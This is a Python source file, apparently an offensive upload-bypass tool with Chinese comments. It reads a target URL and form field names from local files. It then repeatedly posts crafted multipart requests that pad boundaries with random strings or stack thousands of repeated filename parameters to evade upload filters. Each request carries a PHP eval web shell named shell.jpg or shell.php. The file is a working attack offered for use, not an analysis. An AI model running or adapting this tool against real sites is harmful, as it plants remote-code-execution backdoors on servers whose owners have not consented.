import re
import requests
import random,os

class Duplication:
    def __init__(self,data):
        self.data = data

    #boundary内容重复
    def gojileixing1(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        headers = {
            'Host': "%s" % duurl[7:],
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        for zongshu in range(10000):
            for x in range(10):
                stri += base_str[random.randint(0,61)]
                payloads = """
                ------14022921886665468183488432462""" + """
                Content-Disposition: form-data; name="%s"; filename="shell.jpg"
                Content-Type: image/png
                
                <?php @eval($_POST['hack']); ?>
        
                ------14022921886665468183488432462""" % (shangchuan) + """
                ------14022921886665468183488432462--
                ------14022921886665468183488432462;%s
                ------14022921886665468183488432462;%s
                ------14022921886665468183488432462;%s
                ------14022921886665468183488432462;%s
                ------14022921886665468183488432462
                Content-Disposition: form-data; name="%s"; filename="shell.php"
                Content-Type: image/png
                
                <?php @eval($_POST['hack']); ?>
                
                ------14022921886665468183488432462
                Content-Disposition: form-data; name="%s"
        
                %s
                ------14022921886665468183488432462""" % (stri,stri,stri,stri,shangchuan,anniubianlianming, anniu) + """--
        
                """
                response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
                result2 = response.text
                if (result != result2):
                    pass
                else:
                    urls.write('\n' + ''''
boundary内容重复:
%s
''' % payloads + '\n')
                    urls.close()
                    return '''
boundary内容重复:
%s
''' % payloads
        return 0

    #filename重复
    def gojileixing2(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        headers = {
            'Host': "%s" % duurl[7:],
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        zidian = 'filename="shell.jpg"; '
        zidians = ''
        zidian2 = 'filename="shell.php"'
        for x in range(5000):
            if(x == 4999):
                zidians += zidian2
            else:
                zidians += zidian
        payloads = """
        ------14022921886665468183488432462""" + """
        Content-Disposition: form-data; name="%s"; filename="shell.jpg"; %s
        Content-Type: image/png
        
        <?php @eval($_POST['hack']); ?>

        ------14022921886665468183488432462""" % (shangchuan,zidians) + """
        Content-Disposition: form-data; name="%s"

        %s
        ------14022921886665468183488432462""" % (anniubianlianming, anniu) + """--

        """
        response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
        result2 = response.text
        if (result != result2):
            pass
        else:
            urls.write('\n' + ''''
filename重复:
%s
''' %payloads + '\n')
            urls.close()
            return '''
filename重复:
%s
''' %payloads
        return 0

    def kaihuo(self):
        jiance = self.gojileixing1()
        jiance2 = self.gojileixing2()
        jiehe = [jiance, jiance2]
        for x in jiehe:
            if (x):
                print(x)
        print('''
        漏洞情报缓存信息保存在/cache/ip.txt文件里.
        ''')

for x in os.listdir():
    if ('jilu.txt' in x):
        dakai = open('jilu.txt', 'r+').read()
        dat = Duplication(dakai)
        dat.kaihuo()
    else:
        pass  # 功能待开发.